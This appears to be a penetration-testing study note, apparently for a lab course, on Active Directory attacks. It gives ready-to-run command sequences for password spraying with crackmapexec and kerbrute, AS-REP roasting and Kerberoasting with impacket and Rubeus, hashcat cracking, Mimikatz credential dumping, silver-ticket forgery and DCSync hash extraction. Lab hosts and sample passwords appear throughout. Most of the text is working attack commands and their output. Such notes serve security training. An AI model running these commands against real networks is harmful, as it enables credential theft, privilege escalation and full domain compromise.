---
tags: crackmapexec, kerbrute, impacket
---
## Password Attacks (Password spraying)

Review domain's account policy:
(PS) `net accounts`
- Lockout threshold: number of failed login attempts before lockout
- Lockout observation window: amount of time after the last failed login that we can make additional attempts
- Lockout duration

### Using LDAP and ADSI to perform a low and slow password attack against AD users

```powershell
PS C:\Users\jeff> $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() 

PS C:\Users\jeff> $PDC = ($domainObj.PdcRoleOwner).Name 

PS C:\Users\jeff> $SearchString = "LDAP://" 

PS C:\Users\jeff> $SearchString += $PDC + "/" 

PS C:\Users\jeff> $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))" 

PS C:\Users\jeff> $SearchString += $DistinguishedName 

PS C:\Users\jeff> New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
```

If the password for the user account is correct, the object creation will be successful. If the password is invalid, no object will be created and we will receive an exception.

Can use a script for password spraying: https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1

### SMB password spraying (noisy + slow)

```
kali@kali:~$ cat users.txt 
dave 
jen 
pete 

kali@kali:~$ crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```
- if "Pwn3d!" is added to the output, it means that the compromised account has admin privileges on the target system

> use `netexec` instead of `crackmapexec` (syntax same) (enter the venv located in crackmapexec folder in Tools)


### TGT 

If the credentials are valid, we’ll obtain a TGT.

Sends an AS-REQ with the given credentials and examines the response.

Tool: [kerbrute](https://github.com/ropnop/kerbrute) (Linux, Windows)

Windows:
`.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"`

## AS-REP Roasting
The attacker performs an offline password attack using the encrypted part of an AS-REP.

Prerequisite: 
- the AD user account option *Do not require Kerberos preauthentication* is disabled for the target account (by default it is enabled) (to check, see below)

> If the hash generated by one tool doesn't work (e.g. hashcat says signature incorrect), try the other tool

### Tool: Impacket on Kali

Perform AS-REP Roasting with Impacket on Kali:
1. Find the users with *Do not require Kerberos preauthentication* disabled:
   `impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete`
	- `-dc-ip`: ip address of domain controller
	- `-request`: request for TGT
	- `-outputfile`: name of the output file (will be in hashcat format)
	- `corp.com/pete`: specify the authentication user information in the form of `domain/user` (will have to provide password)
2. Check the correct Hashcat mode for AS-REP hash:
   `hashcat --help | grep -i "Kerberos"`
	- Output: `18200 | Kerberos 5, etype 23, AS-REP | Network Protocol`
3. Perform cracking:
   `sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

AS-REP Roasting without creds:
`GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/'`

### Tool: Rubeus on Windows

Perform AS-REP roasting with Rubeus on Windows:
1. RDP to the target Windows machine as a domain user
2. Have Rubeus.exe available on the machine
3. Perform AS-REP roasting:
   `.\Rubeus.exe asreproast /nowrap`
	- `/nowrap`: prevent new lines being added to the resulting AS-REP hashes
4. Copy the AS-REP hash from the output and save it in a file on Kali (e.g. `hashes.asreproast2`). Use Hashcat to crack it:
   `sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

### Only identify users vulnerable to AS-REP

To identify users with the enabled AD user account option *Do not require Kerberos preauthentication*:
- Windows: (PV) `Get-DomainUser - PreauthNotRequired`
- Kali: `impacket-GetNPUsers -dc-ip 192.168.50.70 corp.com/pete`

### GenericWrite or GenericAll permissions

If we have *GenericWrite* or *GenericAll* permissions on another AD account, we could reset their passwords (but this would lock out the user) or modify the User Account Control value of the user to not require Kerberos preauthentication (targeted AS-REP roasting).

We should reset the User Account Control value of the user once we’ve obtained the hash.

## Kerberoasting

Background: 
- When a user wants to access a resource hosted by a Service Principal Name (SPN), the client requests a service ticket that is generated by the domain controller. The service ticket is then decrypted and validated by the application server, since it is encrypted via the password hash of the SPN.
- When requesting the service ticket from the domain controller, no checks are performed to confirm whether the user has any permissions to access the service hosted by the SPN. 
- These checks are performed as a second step only when connecting to the service itself. 
- This means that if we know the SPN we want to target, we can request a service ticket for it from the domain controller. Then, we can crack the password of the service account.

### Kerberoasting with Rubeus from Windows
1. RDP to machine with domain account
2. Get TGS-REP hashes of all SPNs linked with the domain user:
   `.\Rubeus.exe kerberoast /outfile:hashes.kerberoast`
3. Copy the output file of hashes to Kali
4. Check which Hashcat mode to use:
   `hashcat --help | grep -i "Kerberos"`
	- Output: `13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol`, since the hash starts with `$krb5tgs$23$`
5. Crack the hashes:
   `sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

### Kerberoasting with Impacket from Linux
1. `sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete`
	- `corp.com/pete`: Provide domain user credentials
	- `-dc-ip`: IP of domain controller
	- `-request`: Obtain TGS-REP hashes of all SPNs linked with the domain user
2. Store the TGS-REP hash in a file and crack it with Hashcat:
   `sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

> If impacket-GetUserSPNs throws the error `KRB_AP_ERR_SKEW(Clock skew too great)`, we need to synchronize the time of the Kali machine with the domain controller. We can first do `sudo timedatectl set-ntp 0` then use `ntpdate` or `rdate -n [target ip]` to do so.

### Usage

- This technique is powerful if the domain contains high-privilege service accounts with weak passwords, which is not uncommon in many organizations. 
- However, if the SPN runs in the context of a computer account, a managed service account, or a group-managed service account, the password will be randomly generated, complex, and 120 characters long, making cracking infeasible. The same is true for the krbtgt user account which acts as service account for the KDC. 
- Therefore, our chances of performing a successful Kerberoast attack against SPNs running in the context of user accounts is much higher.

### GenericWrite or GenericAll permissions

If we have *GenericWrite* or *GenericAll* permissions on another AD account, we could reset the user’s password but this may raise suspicion. However, we could also set an SPN for the user, kerberoast the account, and crack the password hash in an attack named targeted Kerberoasting.

## Silver Tickets

Prerequisite:
- The service application only checks the user's permissions from the group memberships in the service ticket, but doesn't verify them
- Privileged Account Certificate (PAC) validation is not performed by service application (true most of the time)

Background:
- if we authenticate against an IIS server that is executing in the context of the service account iis_service, the IIS application will determine which permissions we have on the IIS server depending on the group memberships present in the service ticket.
- With the service account password or its associated NTLM hash at hand, we can forge our own service ticket to access the target resource with any permissions. The custom created ticket is called Silver Ticket
- if the service principal name is used on multiple servers, the silver ticket can be leveraged against them all.

Information we need for silver ticket attack:
- SPN password / NTLM hash
	- for this we need to know which machine the target service has a session on
- domain SID
- target SPN

Attack:
1. Connect to target machine via RDP as domain user with local admin
2. Check if our current user already has access to target service:
   `iwr -UseDefaultCredentials http://web04`
	- `http://web04`: the HTTP SPN mapped to the service
3. Start PS as Administrator and launch Mimikatz
4. Extract cached AD credentials:
   `privilege::debug`
   `sekurlsa::logonpasswords`
5. From the output of above, get NTLM hash of target service user account
6. Get domain SID of current user:
   `whoami /user`
	- Omit RID of user from the output:
	  `S-1-5-21-1987370270-658905905-1781884369-1105` (omit the `-1105`)
   Alternatively, we could also retrieve the SID of the SPN user account from the output of Mimikatz, since the domain user accounts exist in the same domain.
7. Obtain target SPN (e.g. for IIS, you would want the HTTP SPN HTTP/web04.corp.com:80)
8. Create silver ticket with Mimikatz:
   `kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin`
	- `/sid:`: domain SID
	- `/domain:`: domain name
	- `/target:`: target where the SPN runs
	- `/service:`: the SPN protocol
	- `/rc4:`: NTLM hash of the SPN
	- `/ptt`: option to allow injection of the forged ticket into the memory of the machine we execute the command on
	- `/user:`: the user to be set in the forged ticket (could be any user since we can set the permissions and groups ourselves)
9. Exit Mimikatz:
   `exit`
10. Check that the ticket is ready to use in memory:
    `klist`
11. Verify access:
    `iwr -UseDefaultCredentials http://web04`
   
## Domain Controller Synchronization

Purpose: Obtain credentials of a domain user

The Directory Replication Service (DRS) Remote Protocol uses replication to synchronize redundant domain controllers. A domain controller may request an update for a specific object, like an account, using the IDL_DRSGetNCChanges API.

Luckily for us, the domain controller receiving a request for an update does not check whether the request came from a known domain controller. Instead, it only verifies that the associated SID has appropriate privileges. If we attempt to issue a rogue update request to a domain controller from a user with certain rights it will succeed.

Prerequisite:
- access to user with the rights *Replicating Directory Changes*, *Replicating Directory Changes All*, and *Replicating Directory Changes in Filtered Set* 
	- By default, members of the *Domain Admins*, *Enterprise Admins*, and *Administrators* groups have these rights assigned.

### Tool: Mimikatz on Windows (domain-joined)
1. Connect to domain-joined Windows machine as user with the necessary rights
2. Run Mimikatz:
   `.\mimikatz.exe`
3. Perform DC Sync attack:
   `lsadump::dcsync /user:corp\dave`
	- `/user:`: provide domain username for which we want to obtain credentials
4. From the output of above, copy the NTLM hash and store it on our Kali. On Kali, run Hashcat to crack the hash:
   `hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

### Tool: impacket on Kali (not domain joined)
1. On Kali, perform DC Sync attack:
   `impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70`
	- `-just-dc-user dave`: target username
	- `corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70`: credentials of a user with the required rights, as well as the IP of the domain controller in the format **domain/user:password@ip**
2. In the output, can find
   `[*] Using the DRSUAPI method to get NTDS.DIT secrets dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::`
   The NTLM hash is the final section



